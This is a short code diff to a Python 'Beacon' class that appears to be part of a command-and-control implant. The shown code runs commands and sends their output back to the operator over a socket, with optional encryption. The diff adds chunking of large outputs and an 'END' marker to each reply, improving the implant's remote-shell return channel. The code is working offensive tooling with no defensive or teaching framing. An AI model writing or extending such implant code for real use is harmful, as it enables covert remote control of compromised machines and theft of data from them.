@@ -36,15 +36,29 @@ class Beacon:
          if self.debugging == True:
             print("Sending:" ,ps.stdout)
          if ps.stdout != None and ps.stdout != b'':
-            if self.encryption == True:
-               self.sock.send(self.encrypt(ps.stdout))
+            if len(ps.stdout) > 65535:
+               for i in range(0, len(ps.stdout), 65535):
+                 chunk = ps.stdout[i:i+65535]
+                 if self.encryption == True:
+                  self.sock.send(self.encrypt(chunk))
+                  self.sock.send(self.encrypt("END".encode()))
+                 else:
+                  self.sock.send(chunk)
+                  self.sock.send("END".encode())
             else:
-               self.sock.send(ps.stdout)
+               if self.encryption == True:
+                 self.sock.send(self.encrypt(ps.stdout))
+                 self.sock.send(self.encrypt("END".encode()))
+               else:
+                 self.sock.send(ps.stdout)
+                 self.sock.send("END".encode())
          else:
             if self.encryption == True:
                self.sock.send(self.encrypt("SUCCESS".encode()))
+               self.sock.send(self.encrypt("END".encode()))
             else:
                self.sock.send("SUCCESS".encode())
+               self.sock.send("END".encode())
       except Exception as e:
                      error_msg = f"ERROR: {str(e)}"
                      if self.debugging == True:
